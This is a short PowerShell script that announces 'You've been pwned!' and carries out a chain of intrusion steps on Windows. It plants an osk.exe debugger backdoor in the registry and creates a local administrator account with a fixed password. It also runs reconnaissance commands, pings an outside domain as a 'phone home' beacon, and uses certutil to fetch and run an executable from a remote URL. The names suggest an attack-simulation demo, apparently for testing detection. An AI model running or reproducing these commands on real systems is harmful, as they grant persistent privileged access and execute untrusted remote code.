function Invoke-Tech
{
	Write-Host "=-=-=-=-=-=-=-=-=-=-=-= You've been pwned! v7 =-=-=-=-=-=-=-=-=-=-=-=";
	Start-Sleep 1;
	
	Write-Host "=-=-=-=-=-=-=-=-=-=-=-= EstablishiПg PersisteПce =-=-=-=-=-=-=-=-=-=-=-= ";
	reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f
	Start-Sleep 1;
	
	Write-Host "=-=-=-=-=-=-=-=-=-=-=-= Running Netstat       =-=-=-=-=-=-=-=-=-=-=-= ";
	netstat -an;
	Start-Sleep 1;
	
	Write-Host "=-=-=-=-=-=-=-=-=-=-=-= Getting Tasks         =-=-=-=-=-=-=-=-=-=-=-= ";
	tasklist;
	Start-Sleep 1;
	
	Write-Host "=-=-=-=-=-=-=-=-=-=-=-= Adding User John      =-=-=-=-=-=-=-=-=-=-=-= ";
	net user /add John SuperhardPassword3
	Start-Sleep 1;
	
	Write-Host "=-=-=-=-=-=-=-=-=-=-=-= Adding to Group       =-=-=-=-=-=-=-=-=-=-=-= ";
	net localgroup administrators John /add
	Start-Sleep 1;
	
	Write-Host "=-=-=-=-=-=-=-=-=-=-=-= Phoning Home          =-=-=-=-=-=-=-=-=-=-=-= ";
	ping systemlowcheck.com -n 1
	Start-Sleep 1;
	
	Write-Host "=-=-=-=-=-=-=-=-=-=-=-= Downloading Webcam    =-=-=-=-=-=-=-=-=-=-=-= ";
	certutil -urlcache -split -f "https://raw.githubusercontent.com/tmmdemo/thenothing/master/TheNothing.exe" "webcam.exe"
	Start-Sleep 1;
	
	Write-Host "=-=-=-=-=-=-=-=-=-=-=-= Running Webcam        =-=-=-=-=-=-=-=-=-=-=-= ";
	webcam.exe -stream
	Start-Sleep 3;
}
